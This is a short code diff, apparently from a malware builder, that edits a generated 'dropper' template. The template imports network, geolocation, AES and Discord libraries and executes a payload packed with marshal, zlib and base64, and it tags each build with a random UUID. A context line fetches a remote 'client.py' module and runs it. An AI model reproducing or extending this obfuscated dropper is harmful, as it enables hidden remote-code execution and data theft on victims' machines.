@@ -168,6 +168,8 @@ create_moduel(url+"client.py").run(url, file_path)"""
             
         dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,geocoder,requests,importlib.util
 from urllib.request import urlopen
+from Crypto.Cipher import AES
+from discord import Embed
 urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
 exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2))))}))))
 #{uuid.uuid4()}"""
